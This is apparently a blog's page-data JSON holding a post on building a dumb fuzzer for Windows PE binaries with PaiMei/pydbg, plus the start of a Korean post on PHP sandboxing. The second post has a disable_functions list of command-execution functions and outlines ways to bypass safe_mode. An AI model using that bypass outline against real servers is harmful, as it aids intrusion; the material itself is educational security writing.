{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/project_fuzz_/",
    "result": {"data":{"cur":{"id":"b1774849-da4b-5855-9b5c-547e7a977783","html":"<h1 id=\"fuzz\" style=\"position:relative;\"><a href=\"#fuzz\" aria-label=\"fuzz permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzz</h1>\n<p><strong>Fuzzing</strong> or <strong>fuzz testing</strong> is an automated <a href=\"https://en.wikipedia.org/wiki/Software_testing\">software testing</a> technique that involves providing invalid, unexpected, or <a href=\"https://en.wikipedia.org/wiki/Random_data\">random data</a> as inputs to a <a href=\"https://en.wikipedia.org/wiki/Computer_program\">computer program</a>. The program is then monitored for exceptions such as <a href=\"https://en.wikipedia.org/wiki/Crash_(computing)\">crashes</a>, failing built-in code <a href=\"https://en.wikipedia.org/wiki/Assertion_(software_development)\">assertions</a>, or potential <a href=\"https://en.wikipedia.org/wiki/Memory_leak\">memory leaks</a>. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a <a href=\"https://en.wikipedia.org/wiki/File_format\">file format</a> or <a href=\"https://en.wikipedia.org/wiki/Communications_protocol\">protocol</a> and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are “valid enough” in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are “invalid enough” to expose <a href=\"https://en.wikipedia.org/wiki/Corner_case\">corner cases</a> that have not been properly dealt with.</p>\n<p>For the purpose of security, input that crosses a <a href=\"https://en.wikipedia.org/wiki/Trust_boundary\">trust boundary</a> is often the most interesting. For example, it is more important to fuzz code that handles the upload of a file by any user than it is to fuzz the code that parses a configuration file that is accessible only to a privileged user.</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Fuzzing\"><em>https://en.wikipedia.org/wiki/Fuzzing</em></a></p>\n<h2 id=\"fuzzer-tool\" style=\"position:relative;\"><a href=\"#fuzzer-tool\" aria-label=\"fuzzer tool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzzer tool</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token number\">1.</span> Window PE <span class=\"token builtin\">file</span> fuzzing operation\n<span class=\"token number\">2.</span> dumb fuzzer\n<span class=\"token number\">3.</span> Customizable TestCase\n<span class=\"token number\">4.</span> GUI Interface using PyQt\n<span class=\"token number\">5.</span> Message Box notification when Crash <span class=\"token keyword\">is</span> detected</code></pre></div>\n<h2 id=\"required-installation\" style=\"position:relative;\"><a href=\"#required-installation\" aria-label=\"required installation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Required installation</h2>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile23.uf@9959693E5C98A9A80FBC86.exe\">PaiMei-1.1.win32.exe</a></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">######################################################################</span>\n<span class=\"token comment\">#  This file should be kept compatible with Python 2.3, see PEP 291. #</span>\n<span class=\"token comment\">######################################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"create and manipulate C data types in Python\"\"\"</span>\n\n<span class=\"token keyword\">import</span> os <span class=\"token keyword\">as</span> _os<span class=\"token punctuation\">,</span> sys <span class=\"token keyword\">as</span> _sys\n\n__version__ <span class=\"token operator\">=</span> <span class=\"token string\">\"1.1.0\"</span>\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Union<span class=\"token punctuation\">,</span> Structure<span class=\"token punctuation\">,</span> Array\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> _Pointer\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> CFuncPtr <span class=\"token keyword\">as</span> _CFuncPtr\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> __version__ <span class=\"token keyword\">as</span> _ctypes_version\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> RTLD_LOCAL<span class=\"token punctuation\">,</span> RTLD_GLOBAL\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> ArgumentError\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Structure <span class=\"token keyword\">as</span> _ctypesStructure       <span class=\"token comment\"># Add for Paimei</span>\n<span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> calcsize <span class=\"token keyword\">as</span> _calcsize\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Structure</span> <span class=\"token punctuation\">(</span>_ctypesStructure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">pass</span>                <span class=\"token comment\"># Add for Paimei</span>\n\n<span class=\"token keyword\">if</span> __version__ <span class=\"token operator\">!=</span> _ctypes_version<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"Version number mismatch\"</span><span class=\"token punctuation\">,</span> __version__<span class=\"token punctuation\">,</span> _ctypes_version<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>For compatibility with python 2.7.x version, modify the <strong>init</strong>.py file.</li>\n</ul>\n<p><code class=\"language-text\">PATH: C:\\Python27\\Lib\\ctypes\\**init**.py</code></p>\n<ul>\n<li>If you added the code in lines 17 and 19, download the rebuilt pydasm.pyd file for Python 2.7.x.</li>\n<li>After that, copy it to the C:\\Python27\\Lib\\site-packages\\pydbg folder.</li>\n</ul>\n<p>If there is an existing pydasm.pyd file, it will be overwritten.</p>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile27.uf@99B4814F5C98AB6A29F4DB.pyd\">pydasm.pyd</a></li>\n</ul>\n<p><strong>pydasm test</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pydbg\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"Hello, pydbg!\"</span></code></pre></div>\n<ul>\n<li>success!</li>\n</ul>\n<h2 id=\"options-cli\" style=\"position:relative;\"><a href=\"#options-cli\" aria-label=\"options cli permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options (CLI)</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">-</span>t<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>target <span class=\"token punctuation\">:</span> Binary to fuzz\n<span class=\"token operator\">-</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>sample <span class=\"token punctuation\">:</span> Sample folder name <span class=\"token punctuation\">(</span>Test Case <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token builtin\">help</span> <span class=\"token punctuation\">:</span> <span class=\"token builtin\">help</span></code></pre></div>\n<h2 id=\"blueprint-gui\" style=\"position:relative;\"><a href=\"#blueprint-gui\" aria-label=\"blueprint gui permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BluePrint (GUI)</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoElEQVQoz2XM+0tTARjG8fOXRESJupbToW66s7a57ezsKBYzm23ulmULF5mlJWkX7YK0bmqNLrSuphSDoDQoiCiqfyCJLlQk9EsFRYVt53zDzaLLDx/e93leeAXX2e84TnzAdvwdSuor0TOgjIEyDvUTfxgvaJgo3LxX542BfBHkC1p+Cs7uDM74MO7RTzQOzODrm8bT9QwxPo15/VNM/5jrxI1PsXc8x9XzhNCu+yhnNJQ0eM9pCN6OFA3BrbiTM1TYAuiW6NDrzUh2O8EVTkIr/zbXSXYH5QaR0iU6FhtkrMdziCPgOqkhtPacJtG9AyU5Q7mjBV1JEfoKC32JJh6cDvDqepiZGxFeZyK8yUTg8TomklEMpjrMpmoOj6ZJ3ftK+nGO9jEN4faVNB/v9BMefY/e2oK+pJhiQw1H4n6+ndrAy2QbL5JtvD26jumhNri4kSs7YhgtEqbKKhLd+9g+/oX+TJbgWQ1haPgR14ZvsnroE2VWP3pdKcZqkVCzn55YhM7WAN2xCNuiYbpCQTYHA0Saw9S5Gig3lFFkVBAHs1j2gfOgimDbDaY+sO3MsszsY5lez3Kbm0bfGup9QRRfgIamVhpXh1F8QeqbAvhWrcXmUNDpllIhNiPvmcU7CPKAiuDbk+P85GfStz4wkrqER65n4aISKivNWGqqqDVXYl9uwemw5ndLTTW1NdUYjQZKihZQViUjbZ/F0wueXhVB6lRp258lOviD4cuvSZ2/y4FjGboGbmHxTyG2TCH6p7D4Jwv7b7extkxiCz1E6swhbdGY+yVE+jVc7RpiDNr3avSPqOw+CVsOgacD5AR4NxX8yn+a66S4hhRX81NoSmjIa1WkmIotqFLrL7CuyeGOZPOkaIFrPv8nquKOank/AVcrGqV8PVvaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-8.png\"\n        title=\"./Bl-8.png\"\n        src=\"/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png\"\n        srcset=\"/static/11b0973c52b4a1db5dee5094314f7265/e9ff0/Bl-8.png 180w,\n/static/11b0973c52b4a1db5dee5094314f7265/f21e7/Bl-8.png 360w,\n/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png 720w,\n/static/11b0973c52b4a1db5dee5094314f7265/302a4/Bl-8.png 1080w,\n/static/11b0973c52b4a1db5dee5094314f7265/07a9c/Bl-8.png 1440w,\n/static/11b0973c52b4a1db5dee5094314f7265/29114/Bl-8.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB8ElEQVQoz3XMS09TQRjG8fPFlF7onJkWiYTKVS4FTEtFAkVMwMICatU2kZ6Woi2KFbysTEzcmLDxQ7jXGKPRaGShiGln/oSeA0kFF7887zt5n7FCD/fxFz8TKH3B73zCX/hI29p7VOk7sXKdjpomvP0vg9oBtWM8nLBU5i0dSy+R1V9EtiFcg8gTEDXwPYbAkVqr9hqoLYPa4hTr7sorni6WiJZ+IDYhXNGIKvRX/pCs7BG//5OE8424Z9L5yuj6HqoKqmpOsaZzH0hn33GxdIDcgEi5QbAKUwuv2RgeZ23kGoXoKM6lGE7vBOXuQdITd5q3qsl46bJ863CuDHYRVNGgCnXUAwglt+gMt9HZ1cXA8BA9A/2IsELYPgJ9c0jHu3eMmx5L5RqEcw1kXiPzBpmrI9dAzOwioinae9P0JYuMzG4S7LlJsHsOeeURkXt4Ha/nseSKQa5o3DymkRmQWZd9C4S3K8+FrCaS0ajV1r4lFw2ttJsLDeRC3UuX3dzr+K838M9D8AYE5lv7VnBaI2YN9pl0q5QmNKPJP9c8e/ObF7v73N4xHP0hUwY7ZbBiy4bIlEEkDPbkGRIGlTTIpDuLhGZsWZNcPeBq5i+jSxoR1yf3VnTKIMcNIvZ/csx1NNsxg++y4fwgTf4h9+349hDx2VedtFeB6QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-10.png\"\n        title=\"./Bl-10.png\"\n        src=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png\"\n        srcset=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/e9ff0/Bl-10.png 180w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/f21e7/Bl-10.png 360w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png 720w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/302a4/Bl-10.png 1080w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/07a9c/Bl-10.png 1440w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/29114/Bl-10.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACp0lEQVQoz0WOW28TVxRG5z9VQm1DZ+w5c86ZOeOxPa4bG8eJ4wQIhFzUpLSmVFwCCaSAUMtFUC4CqQakQoGqJFWkPvUJ8YhUqQFFlaB9QyoU0QZ7vFBMgIelb+29pU/bkhf+wz39hNS3j4nOrVI/D+EVMNfeEVwFfx19BcJrIJsw8xtcv79K895Tztx9Sfg9WGLnLbyRE6gzz8h8/YTiV7+T+WIZd3wZMbmMmPgDPbWCmX6MmXpE3PibQuMRwfSfbNr3gF3H7jBy+V8GfgBzsYMVTp4iU5tAn3xKT/Uo6Q9sHCeD81GAYxscW6HFAFvcW+xO3eS0vsFxcQKRinBFjpSIcWZXkOcgOJtgVcauMjU4Q+b4czbWjvJJIYcM8ghl8FSIkAEmyhMXy5goRuoMQhrSwsf1fOy0Rs4+JDwLwakEa772PwvxP5SOwIfVeXoLMSqIcb2wi9IRHxcrDAxuIZvvxTd5dJBbvxuEilAHVghOQvBNgrV5ssXw9jZmHnpKcxR9RU7n8GSIK0OkCskXStSHt3WL18relGo/i17zPSv4x8A/0saSswl6roU5BHbvPL6SyKCA62VwZURaGHKFMvXhUXrLNbL5Etm4TDZfRgf57qdB4yFmFoKZNpa/KyE91cZtwIZwBrvnPZRWSE8gpUC4KcLQp9pXJo6zRJHpYoyP5wk2vO/gjD4g/TmoRhtLfdrhu9ttLt15QfPHu0zv/wmnb4lo66/IgUW8/gXc6s+I/oWu+0NL6PovpCqLDO1c5HLzNhdu/kVzKaG0J8Ea2tthbC5h674XjB+CypcgtoHe8Q5/7DVrrkZfp9wOhc9g/DCM7F9lx8EW2YkOVnGsQ7q/g9MHdiXB7W+h6y3UYAu1nmuzfuvttzuv1sKutHGqYPd1kIMJrwBIUhS7ZfuiggAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-9.png\"\n        title=\"./Bl-9.png\"\n        src=\"/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png\"\n        srcset=\"/static/ddefedaf5616ff75bb74313a97d51243/e9ff0/Bl-9.png 180w,\n/static/ddefedaf5616ff75bb74313a97d51243/f21e7/Bl-9.png 360w,\n/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png 720w,\n/static/ddefedaf5616ff75bb74313a97d51243/302a4/Bl-9.png 1080w,\n/static/ddefedaf5616ff75bb74313a97d51243/07a9c/Bl-9.png 1440w,\n/static/ddefedaf5616ff75bb74313a97d51243/29114/Bl-9.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#fuzzer-tool\">Fuzzer tool</a></li>\n<li><a href=\"#required-installation\">Required installation</a></li>\n<li><a href=\"#options-cli\">Options (CLI)</a></li>\n<li><a href=\"#blueprint-gui\">BluePrint (GUI)</a></li>\n</ul>\n</div>","excerpt":"Fuzz Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a file format or protocol and distinguishes valid from invalid input. An effective fuzzer generates…","frontmatter":{"date":"December 20, 2020","title":"Development of window GUI binary fuzzing using the dump fuzzing theory.","categories":"projects","author":"Zer0Luck","emoji":"🔎"},"fields":{"slug":"/project_fuzz_/"}},"next":{"id":"dd671d44-da84-5ada-8e07-fb7f748efb94","html":"<h1 id=\"web-application--php\" style=\"position:relative;\"><a href=\"#web-application--php\" aria-label=\"web application  php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application : PHP</h1>\n<ul>\n<li>php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요.</li>\n</ul>\n<p><a href=\"https://dnsdudrla97.github.io/web_application_rce1/\">Web Application RCE Case</a></p>\n<h1 id=\"php-security-1\" style=\"position:relative;\"><a href=\"#php-security-1\" aria-label=\"php security 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Security 1</h1>\n<ul>\n<li>다음은 PHP 보안 기법중 <code class=\"language-text\">Sandbox</code> 에 대하여 설명을 진행할께요.😛</li>\n</ul>\n<h2 id=\"php-sandbox\" style=\"position:relative;\"><a href=\"#php-sandbox\" aria-label=\"php sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Sandbox</h2>\n<aside>\n💡 SandBox 가 뭘까?\n> 애플리케이션 환경에서 대상 리눅스 명령어를 사용할 수 있는 권한이 있더라고 대상 애플리케이션이 설정한 권한 이외의 행동을 수행할 수 없게 한다.\n</aside>\n<p><strong>Disable Function</strong></p>\n<ul>\n<li>애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능</li>\n<li>공격할 수 있는 구간이 존재하여 <code class=\"language-text\">명령 실행(system, proc_open, shell_exec)</code>, <code class=\"language-text\">소켓(socket)</code> , <code class=\"language-text\">통신(curl)</code> 해당 함수들을 이용하는 경우 <code class=\"language-text\">Disable Function으로 작성할 시 공격이 어렵다.</code></li>\n</ul>\n<aside>\n💡 Sandbox 개념에서 시스템 함수들이 비활성화되어 있지만 우회하면 되겠죠?\n</aside>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\"><span class=\"token title important\"><span class=\"token punctuation\">##</span> Disable Function Example</span>\n<span class=\"token list punctuation\">-</span> exec\n<span class=\"token list punctuation\">-</span> passthru\n<span class=\"token list punctuation\">-</span> shell_exec\n<span class=\"token list punctuation\">-</span> system\n<span class=\"token list punctuation\">-</span> proc_open\n<span class=\"token list punctuation\">-</span> popen\n<span class=\"token list punctuation\">-</span> curl_exec\n<span class=\"token list punctuation\">-</span> curl_multi_exec\n<span class=\"token list punctuation\">-</span> parse_ini_file\n<span class=\"token list punctuation\">-</span> show_source</code></pre></div>\n<p><strong>Safe_Mode</strong></p>\n<ul>\n<li><code class=\"language-text\">chroot</code> 가 설정된 <code class=\"language-text\">/var/www/html</code> 디렉토리 가 웹 루트로 설정되어 쉘 명령(<code class=\"language-text\">/bin/ls, /bin/id</code>) 을 사용할 수 없게 된다.</li>\n<li>uid, gid가 다른 경우 접근할 수 없다.\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> 와 같은 파일의 경우 <code class=\"language-text\">safe_mode</code> 의 특정 옵션이 켜지면 접근할 수 없다.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">safe_mode</code> 가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\">cat /etc/php.ini | grep safe_mode</code></pre></div>\n<ul>\n<li><code class=\"language-text\">/etc</code> 밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다.</li>\n</ul>\n<p><strong>Safe_Mode Bypass</strong></p>\n<ul>\n<li>간단하게 <code class=\"language-text\">safe_mode</code> 에 대해서 설명을 했는데 이를 우회하기 위해서는 몇가지 방안이 있다.\n<ul>\n<li>Safe_Mode 취약한 함수를 사용해서 Exploit를 진행 (curl, socket, …)</li>\n</ul>\n</li>\n<li>PHP 에서 사용하는 모듈 취약점을 이용해서 Exploit을 진행\n<ul>\n<li>Mode cgi, PHP-FPM</li>\n</ul>\n</li>\n<li>PHP 에는 많은 CVE가 존재\n<ul>\n<li>모듈 취약점을 사용할시 PHP 버전에 의존하지 않아도 된다.</li>\n<li>PHP 버전과 관계 없는 해당 모듈을 사용하는 하위 버전이 전부 작동한다.</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQY012QbU/CQBCEK28FFQqlVKS0Uit9u6uNEQjw///XY3bN+cEPk5m93ZlMzivrE69JxTp+J4xynuY7xn7EcBzyMFwymqxVCwajlcJptxOWWe49090oyi/q9kJe9JjuStWeSd8MWW5J0oZ91hJvP0gPVt9l/oVhuyt5XiQaqoGtvVI1ZyTYfN441t90/Z3aXMgOliDMiOKCxTJVk7R37Np5g0DDpKVn+ztVc9Im82CPP4uZTDfKYhI9fXzBn23+jP/hvkIa/gDSuGPr6m+9UgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png\"\n        srcset=\"/static/68b2df255fae24cf0c75a2d91c56e424/e9ff0/0.png 180w,\n/static/68b2df255fae24cf0c75a2d91c56e424/f21e7/0.png 360w,\n/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png 720w,\n/static/68b2df255fae24cf0c75a2d91c56e424/58bb7/0.png 985w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"php-rce-1-day-case\" style=\"position:relative;\"><a href=\"#php-rce-1-day-case\" aria-label=\"php rce 1 day case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 